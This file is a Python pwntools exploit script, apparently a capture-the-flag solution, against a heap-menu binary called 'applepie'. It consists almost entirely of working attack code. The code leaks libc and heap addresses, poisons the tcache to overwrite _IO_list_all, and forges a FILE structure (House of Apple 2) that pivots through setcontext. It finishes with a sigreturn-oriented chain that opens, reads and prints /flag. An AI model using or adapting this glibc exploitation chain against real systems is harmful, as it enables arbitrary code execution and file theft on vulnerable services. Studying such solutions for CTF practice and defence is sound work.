#!/usr/bin/env python3
from pwn import *
import os

context.binary = exe = ELF('./applepie_patched')
libc = ELF('./libc.so.6')
context.arch = 'amd64'
# context.log_level = 'debug'

HOST = os.getenv('HOST', '127.0.0.1')
PORT = int(os.getenv('PORT', '8006'))

def start():
    if args.L:
        return process(exe.path)
    return remote(HOST, PORT)

p = start()

def cmd(c):
    p.sendlineafter(b'> ', str(c).encode())

def add(idx, size):
    cmd(1)
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())

def edit(idx, data):
    cmd(2)
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'len: ', str(len(data)).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    cmd(3)
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.recvuntil(b'crumbs: ')
    data = p.recvuntil(b'\n1. add', drop=True)
    if data.endswith(b'\n'):
        data = data[:-1]
    return data

def delete(idx):
    cmd(5)
    p.sendlineafter(b'idx: ', str(idx).encode())

def quit_trigger():
    cmd(6)

# Heap layout: large unsorted source, guard, two tcache chunks, one controlled fake-FILE chunk.
add(0, 0x500)
add(1, 0x20)
add(2, 0x100)
add(3, 0x100)
add(4, 0x1000)

# Make sure show() has deterministic non-empty regions before free metadata overwrites them.
edit(0, b'A' * 8)
edit(2, b'B' * 8)
edit(3, b'C' * 8)
edit(4, b'D' * 8)

# libc leak from unsorted bin fd.
delete(0)
leak = u64(show(0)[:8].ljust(8, b'\0'))
libc.address = leak - 0x203b20
log.success(f'libc = {hex(libc.address)}')

# Exact heap leak: tcache B->fd encodes A; A->fd encodes NULL as A>>12.
delete(2)
delete(3)
key = u64(show(2)[:8].ljust(8, b'\0'))
enc_a = u64(show(3)[:8].ljust(8, b'\0'))
chunk2 = enc_a ^ key
chunk3 = chunk2 + 0x110
fake_file = chunk2 + 0x220
wide = fake_file + 0x100
wide_vtable = fake_file + 0x300
rop_addr = fake_file + 0x400
flag_addr = fake_file + 0xe00
flag_buf = fake_file + 0xe20
log.success(f'heap chunk2 = {hex(chunk2)}')
log.success(f'fake FILE = {hex(fake_file)}')

# Gadgets used only to enter SROP. Sigreturn frames set all syscall registers.
pop_rax = libc.address + 0xdd237
syscall_ret = libc.address + 0x98fb6
ret = libc.address + 0x2882f
pop_rsp = libc.address + 0x3c068
setcontext = libc.sym['setcontext']
io_wfile_jumps = libc.sym['_IO_wfile_jumps']
io_list_all = libc.sym['_IO_list_all']
log.info(f'_IO_list_all = {hex(io_list_all)}')
log.info(f'_IO_wfile_jumps = {hex(io_wfile_jumps)}')
log.info(f'setcontext = {hex(setcontext)}')

# SROP chain: close noisy fds, openat(AT_FDCWD, "/flag", 0) -> read(3, buf, 0x100) -> write(1, buf, 0x100) -> exit(0)
parts = []
cursor = rop_addr

def srop_step(rax, rdi=0, rsi=0, rdx=0):
    global cursor
    chain_addr = cursor
    frame_addr = chain_addr + 0x18
    frame = SigreturnFrame()
    frame.rax = rax
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    frame.rip = syscall_ret
    frame.rsp = frame_addr + len(bytes(frame))
    blob = flat(pop_rax, 15, syscall_ret, bytes(frame))
    parts.append(blob)
    cursor += len(blob)

# Make the next open predictably return fd 3 both locally and under socat.
for fd in range(3, 8):
    srop_step(constants.SYS_close, fd, 0, 0)
srop_step(constants.SYS_openat, (1 << 64) - 100, flag_addr, 0)
srop_step(constants.SYS_read, 3, flag_buf, 0x100)
srop_step(constants.SYS_write, 1, flag_buf, 0x100)
srop_step(constants.SYS_exit, 0, 0, 0)
rop_blob = b''.join(parts)
log.info(f'SROP blob length = {hex(len(rop_blob))}')

# Fake FILE + wide_data + wide vtable for House of Apple 2 -> setcontext+61.
fake = bytearray(0x1000)
# FILE core
fake[0x00:0x08] = p64(0xfbad0000)         # _flags, writable stream-like object
fake[0x20:0x28] = p64(0)                  # _IO_write_base
fake[0x28:0x30] = p64(1)                  # _IO_write_ptr > base, so flush calls overflow
fake[0x30:0x38] = p64(0)                  # _IO_write_end
fake[0x68:0x70] = p64(0)                  # _chain
fake[0x88:0x90] = p64(fake_file + 0x420)  # _lock
fake[0xa0:0xa8] = p64(wide)               # _wide_data / setcontext RSP
fake[0xa8:0xb0] = p64(pop_rsp)            # setcontext RIP -> pop rsp; ret
fake[0xc0:0xc4] = p32(0)                  # _mode <= 0
fake[0xd8:0xe0] = p64(io_wfile_jumps)     # vtable
fake[0xe0:0xe8] = p64(fake_file + 0x500)  # setcontext fenv pointer
fake[0x1c0:0x1c4] = p32(0x1f80)          # setcontext mxcsr
# wide_data
w = 0x100
fake[w + 0x00:w + 0x08] = p64(rop_addr)   # consumed by pop rsp; ret
fake[w + 0x18:w + 0x20] = p64(0)          # wide write_base
fake[w + 0x30:w + 0x38] = p64(0)          # wide buf_base == NULL -> doallocate
fake[w + 0x68:w + 0x70] = p64(0)          # setcontext-loaded rdi
fake[w + 0x70:w + 0x78] = p64(0)          # setcontext-loaded rsi
fake[w + 0x88:w + 0x90] = p64(0)          # setcontext-loaded rdx after pivot
fake[w + 0xa0:w + 0xa8] = p64(rop_addr)   # setcontext RSP
fake[w + 0xa8:w + 0xb0] = p64(ret)        # first RIP: align into rop_blob via ret
fake[w + 0xe0:w + 0xe8] = p64(wide_vtable)
# wide vtable: __doallocate slot -> setcontext+61
fake[0x300 + 0x68:0x300 + 0x70] = p64(setcontext)
fake[0x400:0x400 + len(rop_blob)] = rop_blob
fake[0xe00:0xe08] = b'/flag\x00\x00\x00'
edit(4, bytes(fake))

# Tcache poison size 0x110: allocate an entry overlapping _IO_list_all and write fake FILE ptr.
edit(3, p64(io_list_all ^ (chunk3 >> 12)))
add(5, 0x100)       # returns chunk3
add(6, 0x100)       # returns _IO_list_all
edit(6, p64(fake_file))
verify_list = u64(show(6)[:8].ljust(8, b"\0"))
log.info(f"_IO_list_all now -> {hex(verify_list)}")

if args.SLEEP:
    import time
    log.info("sleep before trigger")
    time.sleep(60)
if args.PAUSE:
    log.info("pause before trigger")
    pause()

# Exit triggers _IO_flush_all_lockp -> _IO_wfile_overflow -> _IO_wdoallocbuf -> setcontext -> SROP ORW.
quit_trigger()
p.interactive()
